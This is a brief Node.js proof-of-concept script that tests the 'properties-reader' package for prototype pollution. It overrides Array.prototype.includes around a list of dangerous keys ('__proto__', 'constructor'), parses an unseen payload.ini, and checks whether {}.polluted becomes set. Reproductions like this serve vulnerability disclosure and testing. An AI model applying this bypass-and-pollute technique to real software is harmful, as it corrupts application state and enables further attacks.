Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const propertiesReader = require('properties-reader');
const path = require('path');
console.log({}.polluted);
propertiesReader(path.resolve(__dirname, './payload.ini'));
console.log({}.polluted);